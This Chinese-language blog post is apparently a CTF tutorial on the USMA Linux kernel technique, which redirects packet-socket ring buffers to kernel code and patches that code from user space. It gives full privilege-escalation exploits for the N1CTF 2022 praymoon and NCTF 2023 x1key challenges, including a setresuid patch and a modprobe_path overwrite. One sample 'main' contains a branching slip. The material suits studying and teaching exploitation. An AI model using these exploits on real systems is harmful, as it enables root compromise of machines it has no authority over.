---
layout: post
title: 0x08. Linux kernel基础：USMA
category: kernel pwn
date: 2025-2-25 12:00:00
---
纯数据攻击的一种方法
<!-- more -->

[toc]

# Linux kernel之USMA

**后记：注意，分配`pg_vec`之前还要先分配一个`0x20`的`obj`的噪声。**

## 0x00. 前言

`USMA`全称即为`User-Space-Mapping-Attack`，大概叫”用户空间映射攻击。

来自于`360`在`blackhat`上的一个议题，原文在[这里](https://vul.360.net/archives/391)。

文章里面通过`CVE`来讲解了一个泄露地址，随后通过泄露的地址来进行`USMA`从而提权的操作。

在`CTF`里面，我们更多用到后半部分，即使用`USMA`这种方法，将内核中的地址映射到用户态，并在用户态上修改代码，从而达到直接在用户态上修改内核态代码的效果。例如，我们可以将内核代码段映射到用户态，并直接修改内核代码本身。更具体的，普通用户使用`setrsuid(0, 0, 0)`函数（设置自身`uid`为`0`）时，由于权限不够，无法操作；此时我们将权限校验的部分代码映射到内存空间，改变其逻辑，便可直接在普通用户权限下使用`setrsuid()`来更改自身权限从而达到提权的目的。

`USMA` 能够缓解找不到`gadget`的问题：其不需要寻找`gadget`，在有诸如`UAF`这种漏洞时，能够直接提权。由此也不会受到`CFI`这种保护机制的阻碍。

## 0x01. 原理

为了加速数据在用户态和内核态的传输，`linux kernel`中的`packet socket`可以创建一个共享环形缓冲区，其创建位于`alloc_pg_vec()`函数：

```c
/net/packet/af_packet.c

4291 static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)         
4292 {         
4293     unsigned int block_nr = req->tp_block_nr;          
4294     struct pgv *pg_vec;     
4295     int i;
4296         
4297     pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);       
4301     for (i = 0; i < block_nr; i++) {     
4302         pg_vec[i].buffer = alloc_one_pg_vec_page(order);      
4305     }        
4308     return pg_vec;    
4314 } 
```

其中，`alloc_one_pg_vec_page`可以申请虚拟内存页，并将申请到的地址保存在`pg_vec`结构体数组的`buffer`成员中。同时，在如下代码片段中：

```c
/net/packet/af_packet.c

4458 static int packet_mmap(file, sock, vma)
4460 {
4491    for (rb = &po->rx_ring; rb <= &po->tx_ring; rb++) {
4495        for (i = 0; i < rb->pg_vec_len; i++) {
4496            struct page *page;
4497            void *kaddr = rb->pg_vec[i].buffer;
4500            for (pg_num = 0; pg_num < rb->pg_vec_pages; pg_num++) {
4501                page = pgv_to_page(kaddr);
4502                err = vm_insert_page(vma, start, page); // here
4503                if (unlikely(err))           
4504                    goto out;     
4505                start += PAGE_SIZE;
4506                kaddr += PAGE_SIZE;
4507            }
4508        }
4509      }
4517    return err;
4518 }
```

可以看到，`packet_mmap`会将这些内核虚拟地址代表的物理页映射到用户态。那么我们可以想到，若我们能够修改`pg_vec`结构体中指向的地址，将其改为内核代码段的虚拟地址，我们即可在用户态修改内核代码段的内容。

此外还需要注意，`vm_insert_page`函数中，存在对传入的`page`的校验：

```c
/mm/memory.c

1753 static int validate_page_before_insert(struct page *page)           
1754 {   
1755     if (PageAnon(page) || PageSlab(page) || page_has_type(page))
1756         return -EINVAL;      
1757     flush_dcache_page(page);        
1758     return 0;      
1759 }    
```

即：

- 不能为匿名页
- 不能为`slab`子系统分配的页
- 不能含有`type` 

上面提到的不能含有`type`有如下四种：

```c
718 #define PG_buddy      0x00000080
719 #define PG_offline    0x00000100
720 #define PG_table      0x00000200
721 #define PG_guard      0x00000400
```

那么：

- 不能为伙伴系统中的页
- 不能为内存交换出去的页
- 不能为用作页表的页
- 不能为用作内存屏障的页

由此，我们传入的页若为内核代码段，以上的检查全部可以绕过。

最后还需要注意一点，即普通用户无法创建原始套接字（`RAW_SOCKET`），因此我们可以创建子命名空间来绕过，并最终在父进程中进行提权。

## 0x02. 实际操作

### 创建子命名空间

上面提到了我们需要在子命名空间才可以进行原始套接字的分配。

使用如下函数即可：

```c
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}
```

即在子进程中使用：

```c
int main(){
    int pipe_fd[2];

    save_status();
    bind_core(0);
    
    pipe(pipe_fd);
    pid_t pid = fork();
    if(!pid){
        // 子进程
        // .......
        // 完成后通知父进程可以执行，自身阻塞
        write(pipe_fd[1], "A", 1);
        pause();
    }else if(pid < 0){
        err_exit("Failed to create child process.");
    }else{
        // 父进程等待子进程完毕后检查自己的uid
        char buf[1];
        read(pipe_fd[0], buf, 1);
        setresuid(0, 0, 0);

        if (!getuid())
        {
            get_root_shell();
        }
        exit(0);
    }
    
}
```

### 分配虚拟内存数组

在`alloc_pg_vec`函数中，主要内存从该行分配：

```c
pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);    
```

其中，`sizeof(struct pgv)`的值为`8`。幸运的是，`block_nr`也是用户可以控制的，因此我们可以使用如下板子来分配一个任意大小的`pg_vec`数组（这个数组里面的所有`pg`都要被覆盖为内核代码段的地址）：

```c
#define PGV_PAGE_NUM 1000
#define PACKET_RX_RING 5
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req
{
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

struct tpacket_req3 {
	unsigned int	tp_block_size;	/* Minimal size of contiguous block */
	unsigned int	tp_block_nr;	/* Number of blocks */
	unsigned int	tp_frame_size;	/* Size of frame */
	unsigned int	tp_frame_nr;	/* Total number of frames */
	unsigned int	tp_retire_blk_tov; /* timeout in msecs */
	unsigned int	tp_sizeof_priv; /* offset to private data area */
	unsigned int	tp_feature_req_word;
};

/* tpacket version for setsockopt */
enum tpacket_versions
{
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif


void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        puts("[X] setsockopt(PACKET_VERSION)");
        exit(-1);
    }
 
    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;
 
    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        puts("setsockopt(PACKET_RX_RING)");
        exit(-1);
    }
}
 
int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        puts("socket(AF_PACKET)");
        exit(-1);
    }
 
    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);
 
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;
 
    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        puts("bind(AF_PACKET)");
        exit(-1);
    }
 
    return s;
}

int alloc_pgv(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}
```

定义好如上内容后，使用如下方式即可简单地获得一个指定大小的，由`pg_vec`数组组成的`obj`：

```c
int packet_fd = alloc_pgv(count, 0x1000);
```

👆上面的 `count` 是指`pg_vec`中含有的`struct pgv`的数量。而`struct pgv`的定义如下：

```c
struct pgv {
	char *buffer;
};
```

因此，若我们要申请一个大小为`0x130`的`obj`，即可以使用如下方式：

```c
int packet_fd = alloc_pgv(0x130 / 8, 0x1000);
```

**这里需要注意，在上面函数过程中，分配`pg_vec`之前还要先分配一个`0x20`的`obj`。因此假如是`0x20`的`UAF`，那么就需要注意了。**



### 篡改虚拟内存数组的内容

这一步往往需要使用题目的漏洞来实现。

例如我们有一个`UAF`，那么我们可以利用`setxattr`等来将`pg_vec`这个`obj`中每一个`struct pgv`指向的地址都改为内核代码的地址。

### 将虚拟地址映射到用户态

也就是最后一步，我们通过刚刚得到的`packet_fd`来将虚拟地址映射到用户态，随后在用户态修改内容即可。

使用如下方式映射：

```c
char *page = mmap(NULL, 0x1000 * (count / 8), PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, 0);
```

如上，其中映射的大小是`0x1000 * (count / 8)`，也就是`alloc_pgv`时，获取的全部页面内容；

此外，我们将`flags`设置为`MAP_SHARED`，表示创建共享的映射区域；

最后在`fd`我们传入`packet_fd`，指定文件描述符为刚刚得到的`packet_ring_buffer`的`fd`即可。

此时，我们便可以直接修改`page`，即可修改内核代码段的数据。

### 示例

假设我们希望修改如下逻辑：

```c
long __sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)
{
    // ...
    if (!ns_capable_setid(old->user_ns, CAP_SETUID)) { // 也就是这个if
        if (ruid != (uid_t) -1        && !uid_eq(kruid, old->uid) &&
            !uid_eq(kruid, old->euid) && !uid_eq(kruid, old->suid))
            goto error;
        if (euid != (uid_t) -1        && !uid_eq(keuid, old->uid) &&
            !uid_eq(keuid, old->euid) && !uid_eq(keuid, old->suid))
            goto error;
        if (suid != (uid_t) -1        && !uid_eq(ksuid, old->uid) &&
            !uid_eq(ksuid, old->euid) && !uid_eq(ksuid, old->suid))
            goto error;
    }
    // ...
}
```

可以看到，在`setresuid`函数中，会校验是否有权限，导致默认情况下低权限用户无法修改自身的`uid`.

那么显然的是，我们可以修改这段逻辑。

我们从`bzImage`提取出`vmlinux`：

```bash
extract_vmlinux ./bzImage
```

随后再使用`vmlinux-to-elf`来获取其大部分符号：

```bash
vmlinux-to-elf ./vmlinux vmlinux_symbol
```

随后在`ida`中，可以看到判断的逻辑如下：

```c
.text:FFFFFFFF81086FD1                 call    ns_capable_setid
.text:FFFFFFFF81086FD6                 test    al, al
.text:FFFFFFFF81086FD8                 jnz     short loc_FFFFFFFF81087044 // 不为0则跳转
```

若我们将`jnz`改为`jmp`，即可让其无条件跳转，使得权限校验失效。即，我们希望将`0xFFFFFFFF81086FD8`地址处的值修改为`0xeb`。（`0xeb`即为`jmp`）

那么，假设有一个属于`kmalloc-512`的`double free`，整个流程为：

```c
int main(){
    bind_core(0);
    save_status();
    
    
    int pipe_fd[2];

    pipe(pipe_fd);
    pid_t pid = fork();

    if (!pid){
        add(); // 申请 kmalloc-512 的 obj

        delete(); // 释放

        int packet_fd = alloc_pgv(0x200 / 8, 0x1000); // 使用pg_vec占据

        delete(); // 释放

        /* 将pg_vec中存放的地址都改为0xFFFFFFFF81086FD8这一页的起始地址 */
        size_t* content = (size_t*)malloc(0x200);
        for(int i = 0 ; i<0x200/8 ; i++){
            content[i] = 0xFFFFFFFF81086000 + kernel_offset;
        }

        edit(content); // 示例，用setxattr等是一样的

        /* 映射到用户内存 */
        char *page = mmap(NULL, 0x1000 * (size / 8), PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, 0);
        page[0xFFFFFFFF81086FD8 - 0xFFFFFFFF81086000] = 0xeb; // 将指定位置修改为jmp
        write(pipe_fd[1], "E", 1);
        pause();
    }else if(!pid){
        char buf[1];
        read(pipe_fd[0], buf, 1);
        setresuid(0, 0, 0);

        if (!getuid())
        {
            success("You are root now!");
            get_root_shell();
        }

        exit(0);
    }
}


```

## 0x03. demo - N1CTF 2022 praymoon

题目逻辑很简单，存在一个`kmalloc-512`，分配`flag`为`GFP_KERNEL | __GFP_ZERO`的`double free`：

```c
__int64 __fastcall seven_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)
{
  __int64 v4; // rdi

  if ( cmd == 0x5555 )
  {
    if ( add_flag <= 0 )
      return 0LL;
    v4 = kmalloc_caches[9];
    ++add_flag;
    moon = (char *)kmem_cache_alloc_trace(v4, 0xDC0LL, 0x200LL);
    printk(" 6Add Success!\n");
    return 0LL;
  }
  else if ( cmd == 0x6666 )
  {
    if ( moon )
    {
      if ( del_flag <= 0 )
        return 0LL;
      --del_flag;
      kfree(moon, cmd, arg);
      printk(" 6del Success!\n");
      return 0LL;
    }
    else
    {
      printk(" 6Your moon doesn't seem to exist ...");
      return -1LL;
    }
  }
  else
  {
    return -1LL;
  }
}
```

给出了`kconfig`，保护全开，尤其注意开启了`CONFIG_MEMCG_KMEM`，这意味着只能考虑`GFP_KERNEL`的结构体来利用：

```markdown
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SHUFFLE_PAGE_ALLOCATOR=y

CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""

CONFIG_MEMCG=y
CONFIG_MEMCG_SWAP=y
CONFIG_MEMCG_KMEM=y

CONFIG_DEBUG_LIST=y

CONFIG_HARDENED_USERCOPY=y
```

内核版本为`5.18`，但允许使用`userfaultfd`：

```c
echo 1 > /proc/sys/vm/unprivileged_userfaultfd
```

很标准的`USMA`利用，我们使用如下流程进行整个的利用：

- 创建子进程，子进程中创建命名空间

- 使用题目功能申请`obj`
- 使用题目功能释放`obj`
- 将其使用`user_key_payload`结构体来占用（注意选择合适的大小，防止临时`obj`占用）
- 使用题目功能释放`obj`
- 使用`setxattr + userfaultfd`，改写`user_key_payload`的`datalen`，并使其睡眠`3s` ---注意(a)



- 通过`user_key_payload`越界读到内核基地址
- 释放`user_key_payload`
- 申请`pg_vec`，大小为`kmalloc-512`
- 让刚刚睡眠的`setxattr`的`obj`此时醒过来，其现在会释放（让前几步中一共睡眠三秒）
- 使用`setxattr + userfaultfd`来多次申请并改写`kmalloc-512`中的`pg_vec`，提高成功率
- 使用`mmap`映射到用户态，改写`setresuid`的逻辑
- 通知父进程检查`uid`并得到`shell`

整个`exp`如下所示：

```c
#include "ltfallkernel.h"

#define ADD 0x5555
#define DELETE 0x6666

int dev_fd;
char* the_page;
size_t *uffd_addr;
size_t* uffd_addr_sleep3;

void add(int fd)
{
    ioctl(fd, ADD);
}

void delete(int fd)
{
    ioctl(fd, DELETE);
}

// 理一下思路，题目提供一个0x200的GFP_KERNEL的obj的double free
// 因此，我们首先申请到obj，并将其释放
// 使用user_key_payload（因为它是GFP_KERNEL）堆喷保证获取到题目的obj
// 再次释放，使用sk_buff或者setxattr来改写内容，使其能够使用user_key_payload越界读获取地址
// 随后，思考提权的方法。我们很难想到有GFP_KERNEL的结构体来进行提权。
// 因此，采取USMA进行提权即可。

// 写一下思路, 题目提供一个0x200的GFP_KERNEL的obj的double free
// add, delete, 使用合适大小的user_key_payload占据(不要被临时obj卡住)

void *setxattr_func(void* content)
{
    info("Fun callled.");
    // setxattr("/exploit", "ltfall", content, 0x200, 0);
    setxattr("/exploit", "ltfall", content, 0x200, 0);
    return NULL;
}

void *uffd_handler_sleep3(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        /* Write your code here */
        info("Start to sleep3....");
        sleep(3);
        info("My sleep is over...");
        
        /* Ends here */
        
        /* set the return value of copy_from/to_user */
        the_page[0] = 0;
        /* Ends here */

        uffdio_copy.src = (unsigned long long)the_page;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}

int main()
{
    int pipe_fd[2];

    save_status();
    bind_core(0);

    the_page = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    pipe(pipe_fd);
    pid_t pid = fork();

    if (!pid)
    {
        // 创建子进程自己的命名空间
        unshare_setup();

        pthread_t monitor, monitor_sleep3;

        uffd_addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        register_userfaultfd_for_thread_stucking(&monitor, (char *)((size_t)uffd_addr + 0x1000), 0x1000);

        uffd_addr_sleep3 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        register_userfaultfd(&monitor_sleep3, (char *)((size_t)uffd_addr_sleep3 + 0x1000), 0x1000, uffd_handler_sleep3);

        int key_id;
        size_t *content = (size_t *)malloc(0x1000);
        memset(content, 0, 0x1000);

        info("Starting to exploit...");

        dev_fd = open("/dev/seven", O_RDONLY);
        if (dev_fd < 0)
        {
            error("Failed to open challenge device!");
            exit(0);
        }

        info("Allocating and freeing obj using challenge function...");
        add(dev_fd);
        delete (dev_fd);

        info("Allocating key...");
        key_id = key_alloc("whatever", "ltfall_here", 0xf0);

        info("Freeing again...");
        delete (dev_fd);

        info("Using setxattr...");

        /**
         * 顺序
         * add delete key_alloc delete setxattr(卡住三秒) -> 目前没在释放状态
         * key_revoke 释放 -> 位于freelist
         * alloc_pgv 拿到
         * （此时释放第一次setxattr卡住的obj）
         * 两次setxattr修改才刚刚放到freelist的obj，概率很大
         */


        for(int k = 0x150; k > 0x0; k = k-0x8){
            *(uint64_t*)((size_t)uffd_addr_sleep3+0x1000-k) = 'd';
        }
        *(uint64_t*)((size_t)uffd_addr_sleep3+0x1000-0x150) = 0x11111111;
        *(uint64_t*)((size_t)uffd_addr_sleep3+0x1000-0x148) = 0x22222222;
        *(uint64_t*)((size_t)uffd_addr_sleep3+0x1000-0x140) = 0x1000;

        pthread_t sleep3thread;
        pthread_create(&sleep3thread, NULL, setxattr_func, (char*)((size_t)uffd_addr_sleep3 + 0x1000 - 0x150));
        sleep(1);

        // content[0] = content[1] = 0x11111111;
        // content[2] = 0x1000;
        // setxattr("/exploit", "ltfall", (char*)content, 0x200, 0);
        
        int ret = key_read(key_id, (void *)content, 0x1000);
        info("Value of ret: 0x%x.", ret);

        kernel_offset = -1;
        for (int i = 0; i < 0x200; i++)
        {
            // info("content[%d] = 0x%llx.", i, content[i]);
            if ((content[i] > 0xffffffff81000000) && ((content[i] & 0xfff) == 0x280))
            {
                kernel_offset = content[i] - 0xffffffff8143e280;
                kernel_base += kernel_offset;
                break;
            }
        }

        if (kernel_offset == -1)
        {
            err_exit("Failed to get kernel addr.");
        }

        success("kernel offset: 0x%llx.", kernel_offset);
        success("kernel base: 0x%llx.", kernel_base);

        /* 释放user_key_payload */
        info("Key revoking...");
        key_revoke(key_id);
        sleep(1);

        /* 接下来，申请kmalloc-512的pgv */
        info("Allocating pgv...");
        int size = 0x130; // 0x130 大小属于kmalloc-512.这0x130的内容全部填充为内核代码段的地址.
        int packet_fd = alloc_pgv(size / 8, 0x1000);


        /* 将申请的pgv指向的地址全部改写为内核代码地址，这里我们修改如下函数的逻辑 */
        /**
         *
        long __sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)
        {
            // ...
            if (!ns_capable_setid(old->user_ns, CAP_SETUID)) {
                if (ruid != (uid_t) -1        && !uid_eq(kruid, old->uid) &&
                    !uid_eq(kruid, old->euid) && !uid_eq(kruid, old->suid))
                    goto error;
                if (euid != (uid_t) -1        && !uid_eq(keuid, old->uid) &&
                    !uid_eq(keuid, old->euid) && !uid_eq(keuid, old->suid))
                    goto error;
                if (suid != (uid_t) -1        && !uid_eq(ksuid, old->uid) &&
                    !uid_eq(ksuid, old->euid) && !uid_eq(ksuid, old->suid))
                    goto error;
            }
            // ...
        }
        */

        /**
         * 其中call ns_capable_setid后面如下所示
         * test al, al
         * jnz xxxxxxx
         * 我们将jnz改为jmp就可以了,
         * 该地址为0xFFFFFFFF81086FD8，改为0xeb即可
         */

        /* 使用setxattr来修改获得的这些pgv，并将它们的虚拟地址指向内核中__sys_setresuid函数的代码地址的页的起始位置即可 */

        sleep(1);
        
        info("Preparing uffd content...");
        int uffd_size = 0x170; // 注意,不要让freelist指针位于uffd卡死地方
        for (int i = 0; i < uffd_size / 8; i++)
        {
            *(size_t*)((size_t)uffd_addr + 0x1000 + i*8 - uffd_size) = 0xFFFFFFFF81086000 + kernel_offset;
        }


        info("Creating 2 threads for uffd...");
        pthread_t p1, p2;

        pthread_create(&p1, NULL, (void *)setxattr_func, (char*)((size_t)uffd_addr + 0x1000 - uffd_size));
        sleep(1);

        pthread_create(&p2, NULL, (void *)setxattr_func, (char*)((size_t)uffd_addr + 0x1000 - uffd_size));
        sleep(1);

        // 然后将pgv的环形缓冲区的那一片内存映射到用户态，从而进行修改
        info("Mmaping kernel code in user mode...");
        char *page = mmap(NULL, 0x1000 * (size / 8), PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, 0);
        page[0xFFFFFFFF81086FD8 - 0xFFFFFFFF81086000] = 0xeb;

        info("Exploit in child is ending...");
        write(pipe_fd[1], "E", 1);
        // sleep(0x200);
        pause();
    }
    else if (pid < 0)
    {
        err_exit("Failed to create child process.");
    }
    else
    {
        char buf[1];
        read(pipe_fd[0], buf, 1);
        info("Parent process trying to get root...");
        setresuid(0, 0, 0);

        info("Show the uid now...");
        if (!getuid())
        {
            success("You are root now!");
            get_root_shell();
        }
        else
        {
            info("Your uid is: %d.", getuid());
            error("Why are you not root?");
        }

        exit(0);
    }
}
```

## 0x04. demo Q & A

都是个人遇到的问题，这里简单总结下

- 为什么第一个`setxattr`要睡眠`3`秒？

提高成功率，使得`setxattr`的`obj`一旦释放时，就马上对`freelist`进行了申请。



- 为什么得到奇怪的报错导致内核崩溃？

检查两点，首先`setxattr+uffd`改写结构体时，结构体部分需要包含在不会阻塞的地方；

其次`setxattr+uffd`申请时，要注意`freelist`的`pointer`的位置，其不能位于会阻塞的地方。例如本题目中`kmalloc-512`的`freelist pointer`位于`33*8=0x108`的位置，因此`uffd`地址在填充时要让大于`0x108`的内容在非阻塞的位置。



## 0x05. demo - NCTF 2023 x1key

逻辑很简单，可以分配`0x20`的`obj`，没有`free`功能，只有个上溢修改上一个`obj`的内容的功能

```c
__int64 __fastcall x1key_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  request request_t; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v5 = __readgsqword(0x28u);
  if ( copy_from_user(&request_t, arg, 8LL) )
    return -14LL;
  if ( x1key_ptr && !(unsigned __int8)_virt_addr_valid() )
    BUG();
  raw_spin_lock(&spinlock_0);
  if ( cmd == 0x101 )
  {
    x1key_ptr = (unsigned __int64 *)kmalloc_trace(kmalloc_caches[5], 0xDC0LL, 32LL);
  }
  else if ( cmd == 0x102 && request_t.idx <= 4u )
  {
    if ( x1key_ptr )
    {
      x1key_ptr[request_t.idx - 1] &= 0xFFFFFFFFF0000000LL;
      x1key_ptr[request_t.idx - 1] += request_t.content;
    }
  }
  raw_spin_unlock(&spinlock_0);
  return 0LL;
}
```

测试一下，没有开启`SLAB_RANDOM_FREELIST`，那么上溢出修改的`obj`就很重要了。



这里的思路是（**注意`kernel`的堆地址是从高到低分配的**）：

- **`0x20`大小的`pg_vec`有一个`0x20`的`obj`的噪声，且先于`pg_vec`分配**

- 申请一个`0x20`的消除噪音的`obj`，这里选择`shm_file`
- 题目功能申请`0x20`的`obj`
- 释放`shm_file`
- 申请`0x20`的`pg_vec`，此时释放的`shm_file`被噪音占据，而`pv_vec`位于题目功能`obj`的低地址
- 循环如下操作：

- - 上溢出修改`pg_vec`的最后一个`pg`
  - 映射到用户态，查看对应位置是否是`modprobe_path`
  - 若不是，则继续小范围爆破，若是则结束



用到了一个小知识点，正常情况下`pg_vec`中指向的地址都位于堆上，而堆上同时也有所有物理页的一份备份。

因此，自然堆上也有`modprobe_path`，因此`partial write`写堆地址到`modprobe_path`即可。



`exp`如下：

```c
#include "ltfallkernel.h"

#define ADD 0x101
#define EDIT 0x102

int dev_fd;

struct request
{
    unsigned int index;
    unsigned int content;
};

void add()
{
    struct request t = {
        .index = 0,
        .content = 0,
    };
    ioctl(dev_fd, ADD, &t);
}

void edit(unsigned int index, unsigned int content)
{
    struct request t = {
        .index = index,
        .content = content,
    };
    ioctl(dev_fd, EDIT, &t);
}

int main()
{
    unshare_setup();

    info("Starting to exploit...");
    dev_fd = open("/dev/x1key", O_RDWR);
    if (dev_fd < 0)
    {
        err_exit("Failed to open x1key...");
    }

    // 先分配shm_file结构体，这个结构体本身是什么并不重要，只是它为0x20
    int shm_fd = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0666);
    char *shm_ptr = shmat(shm_fd, NULL, SHM_RDONLY);

    // 分配题目obj
    add();

    // 释放shm_file结构体
    shmdt(shm_ptr);

    // 随后再占据为pg_vec
    int nr = 0x20 / 8;
    int packet_fd = alloc_pgv(nr, 0x1000);

    // 即可使用 edit 来上溢出
    char *modprobe_path = NULL;
    for (int i = 0; i < 0x80; i++)
    {
        // edit 上溢出
        edit(0, (i << 20) | 0x2a000);

        // 映射到用户态
        char *page = mmap(NULL, nr * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, 0);
        if (page == -1)
        {
            continue;
        }
        
        // 假如映射的对应位置为原本的modprobe，则break并修改，获取flag
        modprobe_path = page + (nr - 1) * 0x1000 + 0xc0;
        if (!strcmp(modprobe_path, "/sbin/modprobe"))
        {
            success("You got that!");
            break;
        }

        // 释放映射的页面
        munmap(page, nr * 0x1000);
    }

    // 将modprobe_path修改为恶意页面
    strcpy(modprobe_path, "/tmp/x");
    get_flag_from_modprobe1();

    return 0;
}
```

## 0x06. demo Q & A

- 为什么要申请`shm_file`这个结构体？

> 因为申请pg_vec的过程中有一个0x20的obj的噪声，先于pg_vec申请。而shm_file刚好为0x20大小。

- 上溢出为什么能修改到`pg_vec`的`obj`？

> 因为内核中堆块的分配方式是从高地址到低地址。

## 参考

[USMA: 用户态映射攻击](https://vul.360.net/archives/391)

[N1CTF - praymoon (USMA)](https://blog.csdn.net/qq_61670993/article/details/133974921)
